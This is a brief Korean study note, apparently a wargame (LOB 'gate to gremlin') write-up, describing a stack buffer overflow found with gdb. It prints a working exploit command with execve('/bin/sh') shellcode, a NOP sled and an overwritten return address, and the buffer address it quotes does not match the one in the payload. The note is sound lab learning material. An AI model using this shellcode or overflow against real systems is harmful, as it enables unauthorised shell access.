#week2
##lob
###gate_to_gremlin
ls -al을 사용하였더니 gremlin파일과 gremlin.c파일을 발견가능하였다.  
gdb 파일로 gremlin을 분석하려고 했으나 권한 때문에 튕겼다.  
혹시나 하는 마음에 cp로 mygremlin 만들었더니 gate gate 권한이다.  
gdb로 연후 disas main을 하였다.(buffer 주소를 알기 위해서)  
main()에서 esp를 0x100(256)만큼 빼는 것을 알 수 있다  
b *main+62(strcpy() 호출후) 해준다.    
r $(python -c 'print("A"*264)')을 실행하고 x/20wx $esp 명령어를 통해    
esp내에 저장되어 있는 buffer의 주소를 확인해준다.    
여기서 x/20wx $esp명령어는 가리키는 메모리로부터 높은 주소 쪽으로    
4byte씩 20개를 출력한다.  
여기서 buffer의 주소는 0xffff928이었다.  
gdb를 벗어난 후에  ./gremlin $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*135+"\x28\xf9\xff\xbf")')와 같이 리틀인디안 방식으로  
명령어를 짜서 bash에 id 명령어를 친후 my-pass 명령어를 통해 password를 확인하여 gremlin으로 이동한다.  
이 문제 푸는데만 얼마나 걸렸는지 모르겠다. 풀다풀다 머리 쥐어뜯겨서 머머리 되는 게 빠를 거 같아  
구글에 뒹구는 풀이들을 참고하였다 ㅎㅎ  
